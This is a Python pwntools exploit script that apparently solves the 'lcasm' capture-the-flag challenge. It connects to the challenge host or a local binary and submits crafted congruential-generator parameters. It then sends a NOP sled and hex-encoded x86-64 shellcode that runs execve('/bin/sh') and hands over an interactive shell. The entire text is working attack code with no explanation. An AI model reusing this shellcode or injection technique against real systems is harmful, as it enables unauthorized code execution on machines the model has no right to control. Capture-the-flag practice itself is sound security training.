#!/usr/bin/env python3
from pwn import *
elf = ELF("./lcasm")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hb', '-F', '#\x7bpane_pid\x7d', '-P']

def conn():
    if args.REMOTE:
        # io = remote(args.HOST, args.PORT)
        #  nc lcasm.chal.imaginaryctf.org 1337/
        io = remote('lcasm.chal.imaginaryctf.org', 1337)
    elif args.GDB:
        gdbscript = """
            b * main+0x121
            c
        """
        io = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        io = process([elf.path])
    return io

r = conn()

s = '0x6733d3a9673c309f 0x4c92da103417030e 0x08b9437d0cfc3f2b 0x3a04d6d85a73ac6c'
mod, a, c, x = [int(i, 16) for i in s.split()]

r.sendlineafter(b'x> ', str(x).encode())
r.sendlineafter(b'a> ', str(a).encode())
r.sendlineafter(b'c> ', str(c).encode())
r.sendlineafter(b'm> ', str(mod).encode())

payload2 = bytes.fromhex('488d3d0900000031c099b03b31f60f052f62696e2f73680090909090909090909090909090909090909090909090909090909090909090909090909090909090ebbe')
r.sendline(b'\x90' * 64 + payload2)

r.interactive()
